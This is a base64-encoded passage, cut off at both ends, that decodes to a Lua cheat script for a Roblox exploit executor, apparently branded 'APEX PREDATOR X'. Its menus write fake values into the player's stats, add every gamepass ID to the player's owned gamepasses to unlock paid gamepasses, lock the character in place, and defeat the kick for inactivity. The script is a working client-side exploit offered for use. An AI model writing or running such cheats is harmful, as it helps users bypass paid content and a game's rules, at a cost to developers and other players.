ZmFsc2UsDQogICAgS2lsbHMgPSBmYWxzZSwNCiAgICBCcmF3bHMgPSBmYWxzZSwNCiAgICBBZ2lsaXR5ID0gZmFsc2UsDQogICAgR29vZEthcm1hID0gZmFsc2UsDQogICAgRXZpbEthcm1hID0gZmFsc2UNCn0NCg0KLS0gRnVuY3Rpb24gdG8gZm9ybWF0IG51bWJlcnMgd2l0aCBhYmJyZXZpYXRpb25zDQpsb2NhbCBmdW5jdGlvbiBmb3JtYXROdW1iZXIobnVtKQ0KICAgIGlmIG5vdCBudW0gdGhlbiByZXR1cm4gIjAiIGVuZA0KICAgIG51bSA9IHRvbnVtYmVyKG51bSkgb3IgMA0KICAgIA0KICAgIGxvY2FsIGZvcm1hdHMgPSB7DQogICAgICAgIHsxZTE4LCAiUWkifSwgezFlMTUsICJRYSJ9LCB7MWUxMiwgIlQifSwgDQogICAgICAgIHsxZTksICJCIn0sIHsxZTYsICJNIn0sIHsxZTMsICJLIn0NCiAgICB9DQogICAgDQogICAgZm9yIF8sIGZvcm1hdCBpbiBpcGFpcnMoZm9ybWF0cykgZG8NCiAgICAgICAgaWYgbnVtID49IGZvcm1hdFsxXSB0aGVuDQogICAgICAgICAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJS4xZiVzIiwgbnVtIC8gZm9ybWF0WzFdLCBmb3JtYXRbMl0pDQogICAgICAgIGVuZA0KICAgIGVuZA0KICAgIHJldHVybiB0b3N0cmluZyhtYXRoLmZsb29yKG51bSkpDQplbmQNCg0KLS0gRnVuY3Rpb24gdG8gcGFyc2UgaW5wdXQgd2l0aCBhYmJyZXZpYXRpb25zIChNYXg6IDEwMDAwUWEpDQpsb2NhbCBmdW5jdGlvbiBwYXJzZU51bWJlcihpbnB1dCkNCiAgICBpZiBub3QgaW5wdXQgdGhlbiByZXR1cm4gMCBlbmQNCiAgICANCiAgICBpbnB1dCA9IHRvc3RyaW5nKGlucHV0KTp1cHBlcigpOmdzdWIoIiVzKyIsICIiKQ0KICAgIA0KICAgIGxvY2FsIG11bHRpcGxpZXJzID0gew0KICAgICAgICBbIlFJIl0gPSAxZTE4LCBbIlFBIl0gPSAxZTE1LA0KICAgICAgICBbIlQiXSA9IDFlMTIsIFsiVFIiXSA9IDFlMTIsDQogICAgICAgIFsiQiJdID0gMWU5LCBbIkJOIl0gPSAxZTksDQogICAgICAgIFsiTSJdID0gMWU2LCBbIk1MIl0gPSAxZTYsDQogICAgICAgIFsiSyJdID0gMWUzLCBbIktOIl0gPSAxZTMNCiAgICB9DQogICAgDQogICAgLS0gQ2hlY2sgaWYgaXQncyBqdXN0IGEgbnVtYmVyDQogICAgbG9jYWwgcGxhaW5OdW0gPSB0b251bWJlcihpbnB1dCkNCiAgICBpZiBwbGFpbk51bSB0aGVuDQogICAgICAgIHJldHVybiBtYXRoLm1pbihwbGFpbk51bSwgMTAwMDBlMTUpIC0tIENhcCBhdCAxMDAwMFFhDQogICAgZW5kDQogICAgDQogICAgLS0gQ2hlY2sgZm9yIGFiYnJldmlhdGlvbiBmb3JtYXQgKGUuZy4sICIxLjVLIiwgIjEwME0iLCAiMi4zQiIpDQogICAgZm9yIGFiYnJldiwgbXVsdGlwbGllciBpbiBwYWlycyhtdWx0aXBsaWVycykgZG8NCiAgICAgICAgbG9jYWwgcGF0dGVybiA9ICJeKFslZCUuXSspIiAuLiBhYmJyZXYgLi4gIiQiDQogICAgICAgIGxvY2FsIG1hdGNoID0gaW5wdXQ6bWF0Y2gocGF0dGVybikNCiAgICAgICAgaWYgbWF0Y2ggdGhlbg0KICAgICAgICAgICAgbG9jYWwgbnVtID0gdG9udW1iZXIobWF0Y2gpDQogICAgICAgICAgICBpZiBudW0gdGhlbg0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRoLm1pbihudW0gKiBtdWx0aXBsaWVyLCAxMDAwMGUxNSkgLS0gQ2FwIGF0IDEwMDAwUWENCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICANCiAgICByZXR1cm4gMA0KZW5kDQoNCi0tIEZ1bmN0aW9uIHRvIHVwZGF0ZSBkaXNwbGF5ZWQgc3RhdHMgaW4gdGhlIGdhbWUNCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUdhbWVTdGF0cygpDQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyDQogICAgDQogICAgLS0gVXBkYXRlIGxlYWRlcnN0YXRzDQogICAgbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikNCiAgICBpZiBsZWFkZXJzdGF0cyB0aGVuDQogICAgICAgIC0tIFN0cmVuZ3RoDQogICAgICAgIGxvY2FsIHN0cmVuZ3RoID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikNCiAgICAgICAgaWYgc3RyZW5ndGggYW5kIHRvZ2dsZVN0YXRlcy5TdHJlbmd0aCB0aGVuDQogICAgICAgICAgICBzdHJlbmd0aC5WYWx1ZSA9IGZha2VTdGF0cy5TdHJlbmd0aA0KICAgICAgICBlbmQNCiAgICAgICAgDQogICAgICAgIC0tIFJlYmlydGhzDQogICAgICAgIGxvY2FsIHJlYmlydGhzID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikNCiAgICAgICAgaWYgcmViaXJ0aHMgYW5kIHRvZ2dsZVN0YXRlcy5SZWJpcnRocyB0aGVuDQogICAgICAgICAgICByZWJpcnRocy5WYWx1ZSA9IGZha2VTdGF0cy5SZWJpcnRocw0KICAgICAgICBlbmQNCiAgICAgICAgDQogICAgICAgIC0tIEtpbGxzDQogICAgICAgIGxvY2FsIGtpbGxzID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIktpbGxzIikNCiAgICAgICAgaWYga2lsbHMgYW5kIHRvZ2dsZVN0YXRlcy5LaWxscyB0aGVuDQogICAgICAgICAgICBraWxscy5WYWx1ZSA9IGZha2VTdGF0cy5LaWxscw0KICAgICAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLktpbGxzIHRoZW4NCiAgICAgICAgICAgIGtpbGxzID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpDQogICAgICAgICAgICBraWxscy5OYW1lID0gIktpbGxzIg0KICAgICAgICAgICAga2lsbHMuVmFsdWUgPSBmYWtlU3RhdHMuS2lsbHMNCiAgICAgICAgICAgIGtpbGxzLlBhcmVudCA9IGxlYWRlcnN0YXRzDQogICAgICAgIGVuZA0KICAgICAgICANCiAgICAgICAgLS0gQnJhd2xzDQogICAgICAgIGxvY2FsIGJyYXdscyA9IGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJCcmF3bHMiKQ0KICAgICAgICBpZiBicmF3bHMgYW5kIHRvZ2dsZVN0YXRlcy5CcmF3bHMgdGhlbg0KICAgICAgICAgICAgYnJhd2xzLlZhbHVlID0gZmFrZVN0YXRzLkJyYXdscw0KICAgICAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkJyYXdscyB0aGVuDQogICAgICAgICAgICBicmF3bHMgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikNCiAgICAgICAgICAgIGJyYXdscy5OYW1lID0gIkJyYXdscyINCiAgICAgICAgICAgIGJyYXdscy5WYWx1ZSA9IGZha2VTdGF0cy5CcmF3bHMNCiAgICAgICAgICAgIGJyYXdscy5QYXJlbnQgPSBsZWFkZXJzdGF0cw0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICANCiAgICAtLSBVcGRhdGUgRHVyYWJpbGl0eQ0KICAgIGxvY2FsIGR1cmFiaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKQ0KICAgIGlmIGR1cmFiaWxpdHkgYW5kIHRvZ2dsZVN0YXRlcy5EdXJhYmlsaXR5IHRoZW4NCiAgICAgICAgZHVyYWJpbGl0eS5WYWx1ZSA9IGZha2VTdGF0cy5EdXJhYmlsaXR5DQogICAgZW5kDQogICAgDQogICAgLS0gVXBkYXRlIEdlbXMgKHVuZGVyIHBsYXllcikNCiAgICBsb2NhbCBnZW1zID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJHZW1zIikNCiAgICBpZiBnZW1zIGFuZCB0b2dnbGVTdGF0ZXMuR2VtcyB0aGVuDQogICAgICAgIGdlbXMuVmFsdWUgPSBmYWtlU3RhdHMuR2Vtcw0KICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuR2VtcyB0aGVuDQogICAgICAgIGdlbXMgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikNCiAgICAgICAgZ2Vtcy5OYW1lID0gIkdlbXMiDQogICAgICAgIGdlbXMuVmFsdWUgPSBmYWtlU3RhdHMuR2Vtcw0KICAgICAgICBnZW1zLlBhcmVudCA9IHBsYXllcg0KICAgIGVuZA0KICAgIA0KICAgIC0tIFVwZGF0ZSBBZ2lsaXR5DQogICAgbG9jYWwgYWdpbGl0eSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQWdpbGl0eSIpDQogICAgaWYgYWdpbGl0eSBhbmQgdG9nZ2xlU3RhdGVzLkFnaWxpdHkgdGhlbg0KICAgICAgICBhZ2lsaXR5LlZhbHVlID0gZmFrZVN0YXRzLkFnaWxpdHkNCiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkFnaWxpdHkgdGhlbg0KICAgICAgICBhZ2lsaXR5ID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpDQogICAgICAgIGFnaWxpdHkuTmFtZSA9ICJBZ2lsaXR5Ig0KICAgICAgICBhZ2lsaXR5LlZhbHVlID0gZmFrZVN0YXRzLkFnaWxpdHkNCiAgICAgICAgYWdpbGl0eS5QYXJlbnQgPSBwbGF5ZXINCiAgICBlbmQNCiAgICANCiAgICAtLSBVcGRhdGUgS2FybWENCiAgICBsb2NhbCBnb29kS2FybWEgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImdvb2RLYXJtYSIpDQogICAgaWYgZ29vZEthcm1hIGFuZCB0b2dnbGVTdGF0ZXMuR29vZEthcm1hIHRoZW4NCiAgICAgICAgZ29vZEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkdvb2RLYXJtYQ0KICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuR29vZEthcm1hIHRoZW4NCiAgICAgICAgZ29vZEthcm1hID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpDQogICAgICAgIGdvb2RLYXJtYS5OYW1lID0gImdvb2RLYXJtYSINCiAgICAgICAgZ29vZEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkdvb2RLYXJtYQ0KICAgICAgICBnb29kS2FybWEuUGFyZW50ID0gcGxheWVyDQogICAgZW5kDQogICAgDQogICAgbG9jYWwgZXZpbEthcm1hID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJldmlsS2FybWEiKQ0KICAgIGlmIGV2aWxLYXJtYSBhbmQgdG9nZ2xlU3RhdGVzLkV2aWxLYXJtYSB0aGVuDQogICAgICAgIGV2aWxLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5FdmlsS2FybWENCiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkV2aWxLYXJtYSB0aGVuDQogICAgICAgIGV2aWxLYXJtYSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQ0KICAgICAgICBldmlsS2FybWEuTmFtZSA9ICJldmlsS2FybWEiDQogICAgICAgIGV2aWxLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5FdmlsS2FybWENCiAgICAgICAgZXZpbEthcm1hLlBhcmVudCA9IHBsYXllcg0KICAgIGVuZA0KZW5kDQoNCi0tIEluc3RydWN0aW9ucyBTZWN0aW9uDQpGYWtlU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiSW5zdHJ1Y3Rpb25zIn0pDQpGYWtlU3RhdHNUYWI6TGFiZWwoe1RpdGxlID0gIvCfk50gSG93IHRvIFVzZSIsIERlc2MgPSAiVG9nZ2xlIE9OIGZvciBlYWNoIHN0YXQgdG8gZW5hYmxlIGZha2Ugc3RhdCJ9KQ0KRmFrZVN0YXRzVGFiOkxhYmVsKHtUaXRsZSA9ICLwn5KhIEZvcm1hdCIsIERlc2MgPSAiMTAwMCBvciAxSyBvciAxLjVNIG9yIDIuM0IgKE1heDogMTAwMDBRYSkifSkNCg0KLS0gSGVscGVyIGZ1bmN0aW9uIHRvIGNyZWF0ZSBzdGF0IGNvbnRyb2xzDQpsb2NhbCBmdW5jdGlvbiBjcmVhdGVTdGF0Q29udHJvbChzdGF0TmFtZSwgZGlzcGxheU5hbWUsIGRlc2NyaXB0aW9uKQ0KICAgIEZha2VTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9IGRpc3BsYXlOYW1lfSkNCiAgICANCiAgICBsb2NhbCBpbnB1dCA9IEZha2VTdGF0c1RhYjpUZXh0Ym94KHsNCiAgICAgICAgVGl0bGUgPSBkaXNwbGF5TmFtZSAuLiAiIFZhbHVlIiwNCiAgICAgICAgRGVzYyA9IGRlc2NyaXB0aW9uLA0KICAgICAgICBQbGFjZWhvbGRlciA9ICJlLmcuLCAxMDAwIG9yIDFLIG9yIDEuNU0iLA0KICAgICAgICBWYWx1ZSA9ICIiLA0KICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpDQogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IHBhcnNlTnVtYmVyKHRleHQpDQogICAgICAgICAgICBmYWtlU3RhdHNbc3RhdE5hbWVdID0gdmFsdWUNCiAgICAgICAgICAgIGlmIHRvZ2dsZVN0YXRlc1tzdGF0TmFtZV0gdGhlbg0KICAgICAgICAgICAgICAgIHVwZGF0ZUdhbWVTdGF0cygpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgfSkNCiAgICANCiAgICBGYWtlU3RhdHNUYWI6VG9nZ2xlKHsNCiAgICAgICAgVGl0bGUgPSBkaXNwbGF5TmFtZSAuLiAiIFRvZ2dsZSIsDQogICAgICAgIERlc2MgPSAiRW5hYmxlIGZha2UgIiAuLiBkaXNwbGF5TmFtZTpsb3dlcigpLA0KICAgICAgICBWYWx1ZSA9IGZhbHNlLA0KICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICAgICAgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSA9IHN0YXRlDQogICAgICAgICAgICBpZiBzdGF0ZSB0aGVuDQogICAgICAgICAgICAgICAgdXBkYXRlR2FtZVN0YXRzKCkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICB9KQ0KZW5kDQoNCi0tIENyZWF0ZSBhbGwgc3RhdCBjb250cm9scw0KY3JlYXRlU3RhdENvbnRyb2woIlN0cmVuZ3RoIiwgIlN0cmVuZ3RoIiwgIkZha2Ugc3RyZW5ndGggc3RhdCIpDQpjcmVhdGVTdGF0Q29udHJvbCgiRHVyYWJpbGl0eSIsICJEdXJhYmlsaXR5IiwgIkZha2UgZHVyYWJpbGl0eSBzdGF0IikgDQpjcmVhdGVTdGF0Q29udHJvbCgiUmViaXJ0aHMiLCAiUmViaXJ0aHMiLCAiRmFrZSByZWJpcnRocyBjb3VudCIpDQpjcmVhdGVTdGF0Q29udHJvbCgiR2VtcyIsICJHZW1zIiwgIkZha2UgZ2VtcyBhbW91bnQiKQ0KY3JlYXRlU3RhdENvbnRyb2woIktpbGxzIiwgIktpbGxzIiwgIkZha2Uga2lsbHMgY291bnQiKQ0KY3JlYXRlU3RhdENvbnRyb2woIkJyYXdscyIsICJCcmF3bHMiLCAiRmFrZSBicmF3bHMgY291bnQiKQ0KY3JlYXRlU3RhdENvbnRyb2woIkFnaWxpdHkiLCAiQWdpbGl0eSIsICJGYWtlIGFnaWxpdHkgc3RhdCIpDQpjcmVhdGVTdGF0Q29udHJvbCgiR29vZEthcm1hIiwgIkdvb2QgS2FybWEiLCAiRmFrZSBnb29kIGthcm1hIikNCmNyZWF0ZVN0YXRDb250cm9sKCJFdmlsS2FybWEiLCAiRXZpbCBLYXJtYSIsICJGYWtlIGV2aWwga2FybWEiKQ0KDQotLSBRdWljayBTZXQgU2VjdGlvbg0KRmFrZVN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlF1aWNrIFNldCJ9KQ0KDQpGYWtlU3RhdHNUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJTZXQgQWxsIHRvIDFRYSIsDQogICAgRGVzYyA9ICJRdWlja2x5IHNldCBhbGwgc3RhdHMgdG8gMSBRdWFkcmlsbGlvbiIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpDQogICAgICAgIGZvciBzdGF0TmFtZSBpbiBwYWlycyhmYWtlU3RhdHMpIGRvDQogICAgICAgICAgICBmYWtlU3RhdHNbc3RhdE5hbWVdID0gMTAwMDAwMDAwMDAwMDAwMA0KICAgICAgICAgICAgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSA9IHRydWUNCiAgICAgICAgZW5kDQogICAgICAgIHVwZGF0ZUdhbWVTdGF0cygpDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiUXVpY2sgU2V0IiwNCiAgICAgICAgICAgIERlc2MgPSAiQWxsIHN0YXRzIHNldCB0byAxUWEgYW5kIGVuYWJsZWQhIiwNCiAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgIH0pDQogICAgZW5kDQp9KQ0KDQpGYWtlU3RhdHNUYWI6QnV0dG9uKHsNCiAgICBUaXRsZSA9ICJEaXNhYmxlIEFsbCBTdGF0cyIsDQogICAgRGVzYyA9ICJUdXJuIG9mZiBhbGwgZmFrZSBzdGF0cyIsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpDQogICAgICAgIGZvciBzdGF0TmFtZSBpbiBwYWlycyh0b2dnbGVTdGF0ZXMpIGRvDQogICAgICAgICAgICB0b2dnbGVTdGF0ZXNbc3RhdE5hbWVdID0gZmFsc2UNCiAgICAgICAgZW5kDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiRmFrZSBTdGF0cyIsDQogICAgICAgICAgICBEZXNjID0gIkFsbCBmYWtlIHN0YXRzIGRpc2FibGVkISIsDQogICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICB9KQ0KICAgIGVuZA0KfSkNCg0KLS0gTWlzYyBUYWINCmxvY2FsIE1pc2NUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJNaXNjIiwgSWNvbiA9ICJzZXR0aW5ncyJ9KQ0KDQotLSBVdGlsaXR5IFNlY3Rpb24NCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiVXRpbGl0eSJ9KQ0KDQpNaXNjVGFiOkJ1dHRvbih7DQogICAgVGl0bGUgPSAiR2FtZXBhc3MgQXV0b0xpZnQiLA0KICAgIERlc2MgPSAiVW5sb2NrIGFsbCBnYW1lcGFzc2VzIiwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgZ2FtZXBhc3NGb2xkZXIgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZ2FtZXBhc3NJZHMNCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXINCiAgICAgICAgZm9yIF8sIGdhbWVwYXNzIGluIHBhaXJzKGdhbWVwYXNzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvDQogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQ0KICAgICAgICAgICAgdmFsdWUuTmFtZSA9IGdhbWVwYXNzLk5hbWUNCiAgICAgICAgICAgIHZhbHVlLlZhbHVlID0gZ2FtZXBhc3MuVmFsdWUNCiAgICAgICAgICAgIHZhbHVlLlBhcmVudCA9IHBsYXllci5vd25lZEdhbWVwYXNzZXMNCiAgICAgICAgZW5kDQogICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgVGl0bGUgPSAiR2FtZXBhc3MgQXV0b0xpZnQiLA0KICAgICAgICAgICAgRGVzYyA9ICJBbGwgZ2FtZXBhc3NlcyB1bmxvY2tlZCEiLA0KICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgfSkNCiAgICBlbmQNCn0pDQoNCi0tIFBlcmZvcm1hbmNlIFNlY3Rpb24NCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiUGVyZm9ybWFuY2UifSkNCg0KTWlzY1RhYjpUb2dnbGUoew0KICAgIFRpdGxlID0gIkhpZGUgRnJhbWVzIiwNCiAgICBEZXNjID0gIlZlcnkgT3AiLA0KICAgIFZhbHVlID0gZmFsc2UsIC0tIERlZmF1bHQgT0ZGDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6R2V0Q2hpbGRyZW4oKSkgZG8NCiAgICAgICAgICAgIGlmIG9iai5OYW1lOm1hdGNoKCJGcmFtZSQiKSB0aGVuDQogICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBub3Qgc3RhdGUNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIENoYXJhY3RlciBTZWN0aW9uDQpNaXNjVGFiOlNlY3Rpb24oe1RpdGxlID0gIkNoYXJhY3RlciJ9KQ0KDQpNaXNjVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiUG9zaXRpb24gTG9jayIsDQogICAgRGVzYyA9ICJMb2NrIHlvdXIgY2hhcmFjdGVyIGluIHBsYWNlIiwNCiAgICBWYWx1ZSA9IGZhbHNlLCAtLSBEZWZhdWx0IE9GRg0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIGlmIHN0YXRlIHRoZW4NCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRQb3MgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lDQogICAgICAgICAgICBnZXRnZW52KCkucG9zTG9jayA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbg0KICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gY3VycmVudFBvcw0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7DQogICAgICAgICAgICAgICAgVGl0bGUgPSAiUG9zaXRpb24gTG9jayIsDQogICAgICAgICAgICAgICAgRGVzYyA9ICJQb3NpdGlvbiBsb2NrZWQgaW4gcGxhY2UhIiwNCiAgICAgICAgICAgICAgICBUaW1lID0gMw0KICAgICAgICAgICAgfSkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgaWYgZ2V0Z2VudigpLnBvc0xvY2sgdGhlbg0KICAgICAgICAgICAgICAgIGdldGdlbnYoKS5wb3NMb2NrOkRpc2Nvbm5lY3QoKQ0KICAgICAgICAgICAgICAgIGdldGdlbnYoKS5wb3NMb2NrID0gbmlsDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgICAgIFRpdGxlID0gIlBvc2l0aW9uIExvY2siLA0KICAgICAgICAgICAgICAgIERlc2MgPSAiUG9zaXRpb24gbG9jayBkaXNhYmxlZCEiLA0KICAgICAgICAgICAgICAgIFRpbWUgPSAzDQogICAgICAgICAgICB9KQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEFudGkgQUZLIFNlY3Rpb24NCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiQW50aSBBRksifSkNCg0KDQpNaXNjVGFiOlRvZ2dsZSh7DQogICAgVGl0bGUgPSAiQW50aSBBRksiLA0KICAgIERlc2MgPSAiUHJldmVudCBiZWluZyBraWNrZWQgZm9yIGluYWN0aXZpdHkiLA0KICAgIFZhbHVlID0gdHJ1ZSwgLS0gRGVmYXVsdCBPRkYNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBpZiBzdGF0ZSB0aGVuDQogICAgICAgICAgICAtLSBDcmVhdGUgRmFkaW5nIERpc3BsYXkNCiAgICAgICAgICAgIGxvY2FsIERpc3BsYXlHdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpDQogICAgICAgICAgICBsb2NhbCBEaXNwbGF5TGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpDQogICAgICAgICAgICBsb2NhbCBUaW1lckxhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBEaXNwbGF5R3VpLk5hbWUgPSAiQW50aUFGS0Rpc3BsYXkiDQogICAgICAgICAgICBEaXNwbGF5R3VpLlBhcmVudCA9IGdhbWUuQ29yZUd1aQ0KICAgICAgICAgICAgRGlzcGxheUd1aS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZw0KICAgICAgICAgICAgDQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuTmFtZSA9ICJEaXNwbGF5TGFiZWwiDQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuUGFyZW50ID0gRGlzcGxheUd1aQ0KICAgICAgICAgICAgRGlzcGxheUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxDQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMC40LCAwLCAwLjAxLCAwKQ0KICAgICAgICAgICAgRGlzcGxheUxhYmVsLlNpemUgPSBVRGltMi5uZXcoMC4yLCAwLCAwLCAzMCkNCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJsYWNrDQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dCA9ICJBUEVYIFBSRURBVE9SIFggLSBBTlRJIEFGSyINCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0U2l6ZSA9IDE4DQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IDANCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuQ2VudGVyDQogICAgICAgICAgICANCiAgICAgICAgICAgIC0tIEdyYWRpZW50IGZvciBEaXNwbGF5TGFiZWwNCiAgICAgICAgICAgIGxvY2FsIGRpc3BsYXlHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpDQogICAgICAgICAgICBkaXNwbGF5R3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7DQogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyOCwgMjE2LCAyMTApKSwgICAtLSAjMUNEOEQyDQogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigxNDcsIDIzNywgMTk5KSkgICAtLSAjOTNFREM3DQogICAgICAgICAgICB9KQ0KICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LlJvdGF0aW9uID0gMA0KICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LlBhcmVudCA9IERpc3BsYXlMYWJlbA0KICAgICAgICAgICAgDQogICAgICAgICAgICBUaW1lckxhYmVsLk5hbWUgPSAiVGltZXJMYWJlbCINCiAgICAgICAgICAgIFRpbWVyTGFiZWwuUGFyZW50ID0gRGlzcGxheUd1aQ0KICAgICAgICAgICAgVGltZXJMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQ0KICAgICAgICAgICAgVGltZXJMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQsIDAsIDAuMDQ1LCAwKQ0KICAgICAgICAgICAgVGltZXJMYWJlbC5TaXplID0gVURpbTIubmV3KDAuMiwgMCwgMCwgMzApDQogICAgICAgICAgICBUaW1lckxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZA0KICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0ID0gIjAwOjAwOjAwIg0KICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0U2l6ZSA9IDEyDQogICAgICAgICAgICBUaW1lckxhYmVsLlRleHRUcmFuc3Bhc